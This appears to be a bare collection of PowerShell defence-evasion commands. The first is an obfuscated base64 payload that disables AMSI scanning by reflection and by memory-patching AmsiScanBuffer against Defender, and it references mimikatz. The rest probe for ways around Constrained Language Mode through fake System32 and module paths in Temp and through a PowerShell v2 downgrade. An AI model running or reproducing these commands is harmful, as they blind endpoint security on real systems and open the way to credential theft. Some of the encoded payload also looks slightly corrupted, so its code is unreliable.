powershell -NoP -Exec Bypass -C "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFM9IlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzIjskRj0iYW1zaUluaXRGYWlsZWQiOyRULT1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCRTKTtpZigkVCkkeyRNPVFUuR2V0RmllbGQoJEYsJydOb25QdWJsaWMsU3RhdGljJykpO2lmKCRNKXskTS5TZXRWYWx1ZSgkbnVsbCxSdHJ1ZSk7V3JpdGUtSG9zdCAi4jggUmVmbGVjdGlvbiBCeXBhc3MgKGFtc2lJbml0RmFpbGVkKSBzdWNjZWVkZWQuIjt9ZWxzZXtXcml0ZS1Ib3N0ICLi7SBSZWZsZWN0aW9uIEJ5cGFzcyBmYWlsZWQgKEZpZWxkIG5vdCBmb3VuZCkuIjt9fWVsc2V7V3JpdGUtSG9zdCAi4u0gUmVmbGVjdGlvbiBCeXBhc3MgZmFpbGVkIChUeXBlIG5vdCBmb3VuZCkuIjt9CiRDPScKW0RsbEltcG9ydChcImtlcm5lbDMyXCIpXWJvb2wgVmlydHVhbFByb3RlY3QoSW50clBsYXRmb3JtIGxwQWRkcmVzcyxVaW50UHRyIGR3U2l6ZSx1aW50IGZsTmV3UHJvdGVjdCxvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7XG5bRGxsSW1wb3J0KFwia2VybmVsMzJcIildSW50clBsYXRmb3JtIEdldFByb2NBZGRyZXNzKEludHJQbGF0Zm9ybSBoTW9kdWxlLHN0cmluZyBscFByb2NOYW1lKTtcbltEbGxJbXBvcnQoXCJrZXJuZWwzMlwiKV1JbnRyUGxhdGZvcm0gR2V0TW9kdWxlSGFuZGxlKHN0cmluZyBscE1vZHVsZU5hbWUpOyc7JE49J0Ftc2lCeXBhc3MnO0FkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAiVXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOyRDIiAtTmFtZSAkTiAtTmFtZXNwYWNlICJXIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsKaWYoW1cuQW1zaUJ5cGFzcyldKXsKICAgIHRyeXsKICAgICAgICAkZD0iYW0iKyJzaS5kIisibGwiOyRmPSJBYSIrInNpU2NhbiIrIkJ1ZmZlciI7CiAgICAgICAgJGE9W1cuQW1zaUJ5cGFzcyk6OkdldFByb2NBZGRyZXNzKFtXAEFtc2lCeXBhc3NdOjpHZXRNb2R1bGVIYW5kbGUoJGQpLCAkZik7CiAgICAgICAgJHA9W2J5dGVbXV0oMHg3MiwweDNBLDB4MUMsMHgzNSwweDAyLDB4MzgsMHgwMCwweDcyLDB4MDApOyMgQ29tcGxleCBwYXRjaCBmb3IgbW9kZXJuIERlZmVuZGVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkcCwwLCRhLCRwLkxvbmdMZW5ndGgpOwogICAgICAgIFtXAEFtc2lCeXBhc3NdOjpWaXJ0dWFsUHJvdGVjdCgkYSwweDc1LDB4NDAsW3JlZl0kbzkgIHwgb3V0LW51bGw7CiAgICAgICAgV3JpdGUtSG9zdCAi4jggTWVtb3J5IFBhdGNoIEJ5cGFzcyAoQW1zaVNjYW5CdWZmZXIpIHN1Y2NlZWRlZC4iO30KICAgIGNhdGNoewogICAgICAgIFdyaXRlLUhvc3QgIuLuIFBhdGNoIEJ5cGFzcyBmYWlsZWQ6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIjsKICAgIH0KfWVsc2V7V3JpdGUtSG9zdCAi4u0gTWVtb3J5IFBhdGNoIEJ5cGFzcyBmYWlsZWQgKEFkZC1UeXBlIGZhaWxlZCkuIjt9CgpHcm91cC1PYmplY3QgLSByYW5kb21BcnJheSwgbWltaWthdHogLSBlcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgb3V0LW51bGw7CldyaXRlLUhvc3QgIi0tLVRlc3QgQ29tcGxldGVSZXBvcnQgLS0tIiB8IEZsdXNoLW91dHB1dA=='))) | Out-String | Select-String -NotMatch 'Out-Null|SilentlyContinue|ErrorAction' -Exclude $null"




cmd /c echo "$ExecutionContext.SessionState.LanguageMode" > system32test.ps1

powershell -NoP -Exec Bypass -C "$P=$pwd.path; md C:\Windows\Temp\System32Test | Out-Null; cp system32test.ps1 C:\Windows\Temp\System32Test\test.ps1; cd C:\Windows\Temp\System32Test; .\test.ps1; cd $P; rm C:\Windows\Temp\System32Test -Recurse -Force | Out-Null"



powershell -NoP -Exec Bypass -C "$P=$pwd.path; $TEST_DIR='C:\Windows\Temp\WindowsPowerShell\v1.0\Modules'; md $TEST_DIR | Out-Null; cp system32test.ps1 $TEST_DIR\test.ps1; cd $TEST_DIR; .\test.ps1; cd $P; rm C:\Windows\Temp\WindowsPowerShell -Recurse -Force | Out-Null"


powershell -version 2 -NoP -Exec Bypass -C "$ExecutionContext.SessionState.LanguageMode"
